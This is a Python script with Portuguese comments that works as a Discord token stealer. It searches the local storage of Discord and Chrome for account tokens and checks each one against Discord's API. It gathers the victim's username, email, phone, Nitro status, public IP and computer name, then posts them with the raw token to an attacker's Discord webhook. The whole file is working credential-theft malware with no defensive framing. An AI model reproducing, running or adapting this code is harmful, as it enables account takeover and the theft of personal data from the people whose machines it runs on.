import re
import os
import sys
import requests
from dhooks import Webhook, Embed


#Criando Variáveis
hook = Webhook('WEBHOOK AQUI')
dir=0
ip = requests.get('https://api.ipify.org').text
usuario = os.getenv('username')
nome_pc = os.environ['COMPUTERNAME']
appdata = os.getenv('APPDATA')
local = os.getenv('LOCALAPPDATA')
temp_dir = local + "\\temp\\"
discord = [appdata + '\\Discord\\Local Storage\\leveldb\\']
discord.append(appdata +'\\discordptb\\Local Storage\\leveldb\\')
discord.append(appdata + '\\discordcanary\\Local Storage\\leveldb\\')
discord.append(local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\')
certo=[]
j=0
c=[]
#Verificando se a pasta existe
while(dir<4):
    if os.path.exists(discord[dir]):
         certo.append(discord[dir])
    else:
        certo.append(0)
    dir += 1
#guardando a quantidade de pasta que achou
quant=len(certo)
#Postando no server informações sobre a pessoa
embed2 = Embed(
        description='Usuário ' + str(usuario) + '\nNome do PC ' + nome_pc + '\nIP: {}'.format(ip),
    timestamp='now'  #horario de agora
    )
if os.path.isfile(temp_dir+"snake.log"):
    True
id = '0'
id_ante = []
while(j<quant):
    folder_selected = certo[j]
    if folder_selected == 0:
        j += 1
        continue
    if os.path.isfile(temp_dir+"snake.log"):
        break
    for root, dirs, files in os.walk(folder_selected):
        for file in files:
            with open (folder_selected+'/'+file,  errors='ignore') as handle:
                try:
                    lines = handle.readlines()
                except Exception as e:
                    e = e
            for line in lines:
                    token = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                    if token != []:
                        c.append(token)
            for line in lines:
                    token = re.findall(r'mfa\.[\w-]{84}', line)
                    if token != []:
                        c.append(token)
    tam=len(c)
    cont=0;
    vet1=[]
    while(cont<tam):
        if(cont!=0):
            conta=0
            tama=len(c[cont])
            while (conta<tama):
                vet1.append(c[cont][conta])
                conta += 1
        else:
            vet1.append(c[cont])
        cont += 1

    tam=len(vet1)
    cont =0
    while(cont<tam):
        checar_token = str(vet1[cont]).strip("[]'")
        headers={'Authorization': checar_token}
        src = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
        if src.status_code != 200:
            cont += 1
            continue
        pagina = src.text
        listid = re.findall(r'[\d-]{18}', pagina)
        listnome = re.findall(r'(?<="username": ")\S+', pagina)
        listavatar = re.findall(r'(?<="avatar": ")\S+', pagina)
        listemail = re.findall(r'(?<="email": ")\S+', pagina)
        listfone = re.findall(r'(?<="phone": ")\S+', pagina)
        id_ante.append(id)
        id = listid[0]
        tama = len(id_ante)
        continu = 0
        cont2=0
        while cont2<tama:
            if id_ante[cont2] == id:
                continu = 1
                break
            cont2+=1
        if continu == 1:
            cont += 1
            continue
        nome = listnome[0].strip('",')
        if listavatar != []:
            avatar = listavatar[0].strip('",')
        else:
            avatar = '0'
        if listemail != []:
            email = listemail[0].strip('",')
        else:
            email = 'Sem email'
        if listfone != []:
            fone = listfone[0].strip('",')
        else:
            fone ='Sem fone'

        src = requests.get('https://discordapp.com/api/v6/users/' + id + '/profile', headers=headers)
        pagina= src.text
        listnitro1 = re.findall(r'(?<="premium_since": )\S+', pagina)
        listnitro2 = re.findall(r'(?<="premium_guild_since": )\S+', pagina)
        nitro1 = listnitro1[0].strip(',')
        nitro2 = listnitro2[0].strip('}')
        if nitro1 != 'null' or nitro2 != 'null':
            nitro = 'Ok'
        else:
            nitro = 'Não'

         #criando formato para publicar no discord 
        if avatar != '0':
            img_perfil = 'https://cdn.discordapp.com/avatars/' + id + '/'+ avatar
        else:
            img_perfil = '**Sem Avatar**'
        hook.send(img_perfil)
        embed = Embed(
            description='**'+ 'id: ' + '<@' + id + '>' + '\n' +  'Nome de Usuário: '+ nome + '\n' + 'Email: ' + email + '\n' + 'Fone: ' + fone + '\n' + 'Nitro: ' + nitro + '\n' + 'Token: ' + checar_token + '\nIP: {}'.format(ip) + '**',
        timestamp='now'  #horario de agora
        )
        hook.send(embed=embed)
        cont += 1

    j += 1

if os.path.isfile(temp_dir+"snake.log"):
    True
else:
    with open (temp_dir+"snake.log", 'w+') as cria:
        cria.write("erro")
        cria.close()
